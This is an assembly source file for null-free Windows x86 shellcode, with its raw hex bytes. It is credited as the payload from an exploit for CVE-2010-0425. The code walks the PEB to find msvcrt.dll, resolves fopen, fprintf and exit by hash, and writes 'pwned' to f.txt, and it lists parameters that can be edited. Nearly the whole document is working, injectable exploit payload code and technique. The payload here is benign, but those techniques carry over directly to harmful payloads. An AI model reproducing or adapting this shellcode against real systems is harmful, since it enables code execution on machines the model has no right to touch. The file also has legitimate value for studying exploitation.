; Write-to-file Shellcode
;
; This shellcode was used in the exploit for: CVE-2010-0425
; Supported: Windows 2000, WinXP, Server 2003, Server 2008, Vista, Windows 7
;
; Size: 278 bytes
; ////////////////////////////////////////////////////////////////////////////////
; \x31\xc0\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x56\x08\x8b\x7e\x20
; \x8b\x36\x66\x39\x4f\x14\x75\xf2\x66\xb9\x01\x6d\x66\x81\xe9\x94\x6c\x66\x39\x0f
; \x66\x89\xc1\x75\xe1\x89\xe5\xeb\x71\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05
; \x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31
; \xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24\x28
; \x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01
; \xe8\x89\x44\x24\x1c\x61\xc3\xad\x50\x52\xe8\xaa\xff\xff\xff\x89\x07\x66\x81\xc4
; \x0c\x01\x66\x81\xec\x04\x01\x66\x81\xc7\x08\x01\x66\x81\xef\x04\x01\x39\xce\x75
; \xde\xc3\xeb\x10\x5e\x8d\x7d\x04\x89\xf1\x80\xc1\x0c\xe8\xcd\xff\xff\xff\xeb\x3b
; \xe8\xeb\xff\xff\xff\x6e\x7c\x2e\xe1\x1e\x3c\x3f\xd7\x74\x1e\x48\xcd\x31\xd2\x58
; \x88\x50\x05\xeb\x2d\x31\xd2\x59\x88\x51\x01\xeb\x2c\x51\x50\xff\x55\x04\xeb\x2a
; \x31\xd2\x59\x88\x51\x05\xeb\x2d\x51\x50\x89\xc6\xff\x55\x08\x53\xff\x55\x0c\xe8
; \xd1\xff\xff\xff\x66\x2e\x74\x78\x74\x4e\xe8\xce\xff\xff\xff\x77\x4e\xe8\xcf\xff
; \xff\xff\xe8\xd1\xff\xff\xff\x70\x77\x6e\x65\x64\x4e\xe8\xce\xff\xff\xff
; ////////////////////////////////////////////////////////////////////////////////
;
; Origin: http://www.senseofsecurity.com.au
; Written by Brett Gervasoni (brettg [at] senseofsecurity.com.au)
;
; By default the shellcode will write "pwned" to a text file titled "f.txt" in
; the current working directory.
;
; Editable parameters:
; Line 228: Filename
;           Be sure to update the length on line 185
; Line 232: Access mode
;           Be sure to update the length on line 193
; Line 239: Data (text to be written)
;           Be sure to update the length on line 208

[SECTION .text]
global _start

_start:
	; if it matters what is on the stack, then allocate space - otherwise, who cares we are exiting anyway?
	; save bytes by not including it...
	;sub esp, 0x0c ; allocate space on the stack for funct addresses

; ======================= Find the base address of msvcrt.dll =======================
	; By checking if a entry in the InInitializationOrder list has a null byte in position
	; 20 we can find the base addr of msvcrt.dll on Windows 7 and Vista.
	; "msvcrt.dll" is equal to 10 bytes, so in unicode, its 20 bytes long.
	; kernel32.dll can be found in a similar fashion. "kernel32.dll" is 12 bytes long though.
	; on WinXP the InInitializationOrder list is as follows: ntdll.dll, kernel32.dll, msvcrt.dll
	; On Windows Server 2003, msvcrt.dll is in position 5 and before this dll is checked, RPCRT4.dll
	; is checked. Which matches the length of msvcrt.dll, as a result the base address of RPCRT4.dll
	; is used. Obviously this is no good. To solve this problem i made the shellcode check for the
	; presents of 'm' in position 0 as well .
	xor eax, eax           ; make sure it is 0
	xor ecx, ecx           ; ECX = 0
    mov esi, [fs:ecx+0x30] ; ESI = &(PEB) ([FS:0x30])
    mov esi, [esi+0x0c]    ; ESI = PEB->Ldr
    mov esi, [esi+0x1c]    ; ESI = PEB->Ldr.InInitOrder
NextModule:
	mov edx, [esi+0x08]    ; EDX = InInitOrder[X].base_address
    mov edi, [esi+0x20]    ; EDX = InInitOrder[X].module_name (unicode)
    mov esi, [esi]         ; ESI = InInitOrder[X].flink (next module)
    cmp [edi+10*2], cx     ; modulename[12] == 0 ?
    jne NextModule         ; No: try next module.

	; extra check to find msvcrt.dll
	mov cx, 0x6d01         ; m = 0x6d
	sub cx, 0x6c94
                           ; result is 0x6d (m)
	cmp [edi], cx          ; modulename[0] == m ?
	mov cx, ax
	jne NextModule

	; base address of msvcrt.dll is now in edx
	; update ebp
	mov ebp, esp

	jmp short GetHashesSpring ; using a spring to avoid null bytes

; ======================= FUNCTIONS =======================
; Export Directory Table method
find_function:
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp
compute_hash:
    xor edi, edi
    xor eax, eax
    cld
compute_hash_again:
    lodsb
    test al, al
    jz compute_hash_finished
    ror edi, 0xd
    add edi, eax
    jmp short compute_hash_again
compute_hash_finished:
find_function_compare:
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret

ResolveSymbolsForDLL:
    lodsd
    push eax                    ; push hashes for find_function
    push edx
    call find_function
    mov [edi], eax              ; save found function address
    ;add sp, 0x08
	add sp, 0x10c ; + 268
	sub sp, 0x104 ; - 260 = 8
    ;add di, 0x04               ; increment edi by 4 (due to function address being saved)
	add di, 0x108 ; + 264
	sub di, 0x104 ; - 260 = 4
    cmp esi, ecx                ; check if esi meets length of hash list
    jne ResolveSymbolsForDLL
ResolveSymbolsForDLLComplete:
    ret

; ====================== / FUNCTIONS ======================

GetHashesSpring:
	jmp short GetHashes ; using a spring to avoid null bytes

HashesReturn:
    pop esi
    lea edi, [ebp + 0x04]
    mov ecx, esi
    add cl, 0x0c              ; length of function hash list

    call ResolveSymbolsForDLL

	jmp short GetFilename

GetHashes:
    call HashesReturn

    ; msvcrt.dll hash list
    ; fopen hash = 0x6E7C2EE1
    db 0x6E
    db 0x7C
    db 0x2E
    db 0xE1

    ; fprintf hash = 0x1E3C3FD7
    db 0x1E
    db 0x3C
    db 0x3F
    db 0xD7
	; since the message is small, no need to worry about closing the file
	; keep the shellcode smaller that way.

	; exit hash = 0x741E48CD
	db 0x74
	db 0x1E
	db 0x48
	db 0xCD

GetFilenameReturn:
	xor edx, edx ; zero out a reg for nulls

	pop eax ; f.txt
	mov [eax+5], dl ; insert a null byte, 'f.txt'

	jmp short GetFileMode

GetFileModeReturn:
	xor edx, edx ; zero out a reg for nulls

	pop ecx ; w
	mov [ecx+1], dl ; insert a null byte, 'w'

	jmp short GetfopenCall ; Now jump to fopen call

fopenCall:
	push ecx ; 'w'
	push eax ; push 'f.txt'
	call [ebp+4]; call fopen

	jmp short GetfprintfData

GetfprintfDataReturn:
	xor edx, edx ; zero out a reg for a null

	pop ecx ; push data string
	mov [ecx+5], dl ; insert a null byte

	jmp short GetfprintfCall

fprintfCall:
	push ecx ; data
	push eax ; handle

	mov esi, eax ; we want to keep the handle for close

	call [ebp+8] ; call fprintf

; It needs to either exit, or call fclose to write the buffer to file.
ExitProcessCall:
	push ebx ; ebx has 00004000 in it - who cares what we give exit?

	call [ebp+0x0c] ; exit

GetFilename:
	call GetFilenameReturn
	db 'f.txtN' ; filename

GetFileMode:
	call GetFileModeReturn
	db 'wN' ; file access mode

GetfopenCall:
	call fopenCall

GetfprintfData:
	call GetfprintfDataReturn
	db 'pwnedN' ; data to be written to file

GetfprintfCall:
	call fprintfCall